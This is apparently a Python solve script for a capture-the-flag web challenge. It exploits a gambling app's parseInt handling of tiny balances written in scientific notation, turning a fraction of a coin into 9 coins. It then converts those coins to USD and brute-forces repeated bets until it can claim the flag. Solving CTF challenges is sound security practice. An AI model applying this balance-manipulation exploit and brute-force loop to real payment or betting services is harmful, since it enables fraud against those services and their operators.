import requests
import time

URL = "https://chall.polygl0ts.ch:8148"

# Configuration
# We start with 10e-6 (10 microcoins). We want ~0.9e-6.
# We need to lose 9.1 microcoins.
BET_TO_REDUCE = 0.0000091

def attempt_solve(session_id):
    s = requests.Session()
    
    # 1. Gamble to reduce balance to ~9e-7 range
    # We rely on the 91% loss chance. If we win, we just restart.
    try:
        r = s.post(f"{URL}/api/gamble", json={
            "currency": "coins", 
            "amount": BET_TO_REDUCE
        }, timeout=5)
        
        data = r.json()
        if "new_balance" not in data:
            return False
            
        # If we won, we have too much money to easily drop to e-7. Restart.
        if data['win']:
            return False
            
        # Balance should now be around 9e-7.
        # parseInt(9e-7) -> 9.
        
        # 2. Convert "Ghost" Coins to USD
        # We try to convert 9 coins.
        r = s.post(f"{URL}/api/convert", json={"amount": 9}, timeout=5)
        if r.status_code != 200:
            return False

        # We now have $0.09 USD. We need $10.
        # We need 3 consecutive wins (0.09 -> 0.9 -> 9.0 -> 90.0).
        
        current_usd = 0.09
        
        # Win 1
        r = s.post(f"{URL}/api/gamble", json={
            "currency": "usd",
            "amount": current_usd
        }, timeout=5)
        if not r.json().get('win'): return False
        current_usd = r.json()['new_balance'] # Should be 0.9

        # Win 2
        r = s.post(f"{URL}/api/gamble", json={
            "currency": "usd",
            "amount": current_usd
        }, timeout=5)
        if not r.json().get('win'): return False
        current_usd = r.json()['new_balance'] # Should be 9.0

        # Win 3 (To cross $10)
        r = s.post(f"{URL}/api/gamble", json={
            "currency": "usd",
            "amount": current_usd
        }, timeout=5)
        if not r.json().get('win'): return False
        
        # 3. Get Flag
        r = s.post(f"{URL}/api/flag", timeout=5)
        if r.status_code == 200:
            print(f"\n[+] FLAG: {r.json()['flag']}")
            return True
            
    except Exception as e:
        pass
        
    return False

print("[*] Starting brute force... (Probability ~1/1370)")
count = 0
while True:
    count += 1
    if count % 50 == 0:
        print(f"[*] Attempt {count}...")
    
    if attempt_solve(count):
        break